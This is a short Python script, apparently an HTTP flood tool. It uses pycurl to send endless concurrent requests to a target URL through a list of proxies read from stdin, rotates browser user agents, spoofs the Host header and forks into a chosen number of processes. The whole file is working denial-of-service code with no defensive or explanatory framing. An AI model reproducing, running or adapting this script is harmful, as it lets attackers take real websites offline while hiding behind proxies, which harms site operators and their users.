#!/usr/bin/python

import sys, os, signal, pycurl
from time import time
from random import choice

useragents = [
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)"
]

handles = []
SELECT_TIMEOUT = 5

pycurl.global_init(pycurl.GLOBAL_DEFAULT)

for line in sys.stdin:
    handle = pycurl.Curl()
    handle.setopt(pycurl.URL, sys.argv[1])
    handle.setopt(pycurl.PROXY, line.strip())
    handle.setopt(pycurl.FOLLOWLOCATION, 1)
    handle.setopt(pycurl.TIMEOUT, 5)
    handle.setopt(pycurl.MAXCONNECTS, 0)
    handle.setopt(pycurl.USERAGENT, choice(useragents))
    handle.setopt(pycurl.HTTPHEADER, [
        "Host: %s" % sys.argv[2],
        "Accept-Encoding: gzip, deflate"
    ])
    handles.append(handle)

for i in range(int(sys.argv[3]) - 1):
    if os.fork() == 0:
	break

while True:

    multi = pycurl.CurlMulti()

    for handle in handles:
        multi.add_handle(handle)

    init = time()

    num_handles = len(handles)
    while num_handles:

        if time() - init > SELECT_TIMEOUT: break

        ret = multi.select(SELECT_TIMEOUT)
        if ret == -1: continue
        while True:
            ret, num_handles = multi.perform()
            if ret != pycurl.E_CALL_MULTI_PERFORM: break

    for handle in handles:
        multi.remove_handle(handle)

    multi.close()

pycurl.global_cleanup()
